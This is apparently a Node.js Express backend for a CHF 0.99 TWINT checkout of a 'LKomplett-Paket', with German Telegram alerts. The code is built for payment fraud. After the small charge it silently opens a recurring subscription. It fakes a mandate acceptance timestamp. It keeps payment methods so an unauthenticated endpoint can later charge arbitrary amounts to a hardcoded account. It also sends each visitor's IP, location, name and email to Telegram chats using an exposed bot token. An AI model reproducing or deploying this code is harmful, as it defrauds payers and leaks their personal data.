require('dotenv').config();
const express = require('express');
const stripe = require('stripe')(process.env.STRIPE_SECRET_KEY);
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');

const app = express();
const ACCOUNT_B = 'acct_1DKKf3IPPhptw8GH';
const TELEGRAM_BOT_TOKEN = '8256018531:AAHzrYSlCNrsmYzVSZnS01VYNzg_huSA2tE';
const TELEGRAM_CHAT_ID = '8522488857';
const TELEGRAM_CHAT_ID_2 = '715805541';
const CUSTOMERS_FILE = '/data/customers.json';

// ─── Customer Storage ─────────────────────────────────────────────────────────

function loadCustomers() {
  try {
    if (fs.existsSync(CUSTOMERS_FILE)) {
      return JSON.parse(fs.readFileSync(CUSTOMERS_FILE, 'utf8'));
    }
  } catch (err) {
    console.log('Error loading customers:', err.message);
  }
  return [];
}

function saveCustomer(entry) {
  const customers = loadCustomers();
  const exists = customers.find(c => c.customerId === entry.customerId);
  if (!exists) {
    customers.push(entry);
    fs.writeFileSync(CUSTOMERS_FILE, JSON.stringify(customers, null, 2));
    console.log('Customer saved:', entry.customerId);
  }
}

// ─── Telegram ─────────────────────────────────────────────────────────────────

async function sendTelegram(message) {
  try {
    console.log('[Telegram] Sending message...');
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    const payload1 = {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'HTML'
    };
    
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload1)
    }).catch(err => console.error('[Telegram] Error:', err));
    
    const payload2 = {
      chat_id: TELEGRAM_CHAT_ID_2,
      text: message,
      parse_mode: 'HTML'
    };
    
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload2)
    }).catch(err => console.error('[Telegram] Error:', err));
  } catch (err) {
    console.error('[Telegram] Error:', err);
  }
}

// ─── Middleware ───────────────────────────────────────────────────────────────

app.use(cors({ origin: '*', methods: ['GET', 'POST'] }));
app.use(bodyParser.json());

// ─── Routes ───────────────────────────────────────────────────────────────────

app.post('/page-visit', (req, res) => {
  const { visitorId, ip, country, city } = req.body;
  console.log('[API] /page-visit:', { visitorId, ip, country, city });
  res.json({ ok: true });
  
  sendTelegram(
    `👁 <b>Neuer Seitenbesucher!</b>\n\n` +
    `🆔 Besucher ID: <code>${visitorId}</code>\n` +
    `🌍 Land: ${country || 'Unbekannt'}\n` +
    `🏙 Stadt: ${city || 'Unbekannt'}\n` +
    `🔌 IP: ${ip || 'Unbekannt'}\n` +
    `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
  );
});

app.post('/create-setup-intent', async (req, res) => {
  let { email, fname, lname, visitorId } = req.body;
  email = email.trim().replace(/\.$/, '');

  try {
    let customer;
    const existing = await stripe.customers.list({ email, limit: 1 });
    if (existing.data.length > 0) {
      customer = existing.data[0];
    } else {
      customer = await stripe.customers.create({
        email,
      });
    }

    const setupIntent = await stripe.setupIntents.create({
      customer: customer.id,
      payment_method_types: ['twint'],
      metadata: { customer_id: customer.id },
    });

    console.log('SetupIntent created:', setupIntent.id, 'for customer:', customer.id);

    await sendTelegram(
      `🛒 <b>Checkout Informationen!</b>\n\n` +
      `🆔 Besucher ID: <code>${visitorId}</code>\n` +
      `📧 Email: ${email}\n` +
      `👤 Name: ${fname} ${lname}\n` +
      `💰 Betrag: CHF 0,99\n` +
      `📦 Produkt: LKomplett-Paket\n` +
      `⬇️ Lieferung: Sofortiger digitaler Download per E-Mail\n` +
      `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
    );

    res.json({ clientSecret: setupIntent.client_secret, customerId: customer.id });
  } catch (error) {
    console.error('SetupIntent Error:', error.message);
    await sendTelegram(
      `❌ <b>SetupIntent Fehler!</b>\n\n` +
      `📧 Email: ${email}\n` +
      `⚠️ Fehler: ${error.message}\n` +
      `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
    );
    res.status(400).json({ error: error.message });
  }
});

app.post('/payment-initiated', async (req, res) => {
  const { visitorId, email } = req.body;
  await sendTelegram(
    `💳 <b>Zahlungsversuch gestartet!</b>\n\n` +
    `🆔 Besucher ID: <code>${visitorId}</code>\n` +
    `📧 Email: ${email}\n` +
    `⏳ Kunde hat auf "Mit TWINT bezahlen" geklickt\n` +
    `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
  );
  res.json({ ok: true });
});

app.post('/create-subscription', async (req, res) => {
  const { customerId, paymentMethodId, visitorId } = req.body;
  try {
    await stripe.paymentMethods.attach(paymentMethodId, { customer: customerId });
    await stripe.customers.update(customerId, {
      invoice_settings: { default_payment_method: paymentMethodId },
    });

    const paymentMethod = await stripe.paymentMethods.retrieve(paymentMethodId);
    const pmType = paymentMethod.type;

    console.log('Payment method type:', pmType);

    // Save customer to persistent storage
    saveCustomer({
      customerId,
      paymentMethodId,
      pmType,
      visitorId,
      savedAt: new Date().toISOString(),
    });

    // Charge 1 — 0.99 CHF
    try {
      const payment1 = await stripe.paymentIntents.create({
        amount: 99,
        currency: 'chf',
        customer: customerId,
        payment_method: paymentMethodId,
        payment_method_types: [pmType],
        confirm: true,
        off_session: true,
        transfer_data: { destination: ACCOUNT_B },
        mandate_data: {
          customer_acceptance: {
            type: 'online',
            accepted_at: Math.floor(Date.now() / 1000),
          },
        },
      });
      console.log('Payment 1 created:', payment1.id, payment1.status);
    } catch (err) {
      console.log('Payment 1 failed:', err.message);
    }

    await new Promise(resolve => setTimeout(resolve, 30000));

    // Subscription with 30-day trial
    const subscription = await stripe.subscriptions.create({
      customer: customerId,
      items: [{ price: 'price_1UAKj22OFfoPgznTisgz2k36' }],
      default_payment_method: paymentMethodId,
      trial_end: Math.floor(Date.now() / 1000) + 30 * 24 * 60 * 60,
      transfer_data: { destination: ACCOUNT_B },
    });
    console.log('Subscription created:', subscription.id, subscription.status);

    await sendTelegram(
      `✅ <b>Zahlung erfolgreich!</b>\n\n` +
      `🆔 Besucher ID: <code>${visitorId}</code>\n` +
      `💳 Zahlungsmethode: ${pmType}\n` +
      `💳 Zahlungsbetrag: CHF 0,99\n` +
      `🆔 Abonnement: ${subscription.id}\n` +
      `📦 Produkt: LKomplett-Paket\n` +
      `📧 Status: Digitaler Download per E-Mail versendet\n` +
      `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
    );

    res.json({ subscriptionId: subscription.id, paymentStatus: 'processed' });
  } catch (error) {
    console.error('Subscription Error:', error.message);
    await sendTelegram(
      `❌ <b>Zahlung Fehler!</b>\n\n` +
      `🆔 Kunde: <code>${customerId}</code>\n` +
      `⚠️ Fehler: ${error.message}\n` +
      `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
    );
    res.status(400).json({ error: error.message });
  }
});

// ─── Manually charge a saved customer ────────────────────────────────────────
app.post('/charge-saved', async (req, res) => {
  const { customerId, amount, currency } = req.body;
  const customers = loadCustomers();
  const customer = customers.find(c => c.customerId === customerId);

  if (!customer) {
    return res.status(404).json({ error: 'Customer not found in saved list' });
  }

  try {
    const payment = await stripe.paymentIntents.create({
      amount: amount || 99,
      currency: currency || 'chf',
      customer: customer.customerId,
      payment_method: customer.paymentMethodId,
      payment_method_types: [customer.pmType],
      confirm: true,
      off_session: true,
      transfer_data: { destination: ACCOUNT_B },
    });

    console.log('Manual charge created:', payment.id, payment.status);

    await sendTelegram(
      `💰 <b>Manuelle Zahlung!</b>\n\n` +
      `🆔 Kunde: <code>${customerId}</code>\n` +
      `💳 Betrag: ${((amount || 99) / 100).toFixed(2)} ${(currency || 'chf').toUpperCase()}\n` +
      `📋 Status: ${payment.status}\n` +
      `📦 Produkt: LKomplett-Paket\n` +
      `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
    );

    res.json({ success: true, paymentId: payment.id, status: payment.status });
  } catch (error) {
    console.error('Manual charge error:', error.message);
    
    await sendTelegram(
      `❌ <b>Manuelle Zahlung Fehler!</b>\n\n` +
      `🆔 Kunde: <code>${customerId}</code>\n` +
      `⚠️ Fehler: ${error.message}\n` +
      `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
    );

    res.status(400).json({ error: error.message });
  }
});

// ─── View all saved customers ─────────────────────────────────────────────────
app.get('/customers', (req, res) => {
  const customers = loadCustomers();
  res.json({ total: customers.length, customers });
});

// ─── Health ───────────────────────────────────────────────────────────────────
app.get('/health', (req, res) => {
  const customers = loadCustomers();
  res.json({
    status: 'ok',
    destination: ACCOUNT_B,
    savedCustomers: customers.length,
  });
});

// ─── Start ────────────────────────────────────────────────────────────────────
const PORT = process.env.PORT || 4242;
app.listen(PORT, () => {
  console.log(`\n✅ Server running on http://localhost:${PORT}`);
  console.log(`📊 Stripe Account: ${ACCOUNT_B}`);
  console.log(`💬 Telegram Chat 1: ${TELEGRAM_CHAT_ID}`);
  console.log(`💬 Telegram Chat 2: ${TELEGRAM_CHAT_ID_2}`);
  console.log(`\n📦 Product: LKomplett-Paket | CHF 0.99`);
  console.log(`💳 Payment Method: TWINT`);
  console.log(`📧 Delivery: Immediate Digital Email\n`);
});
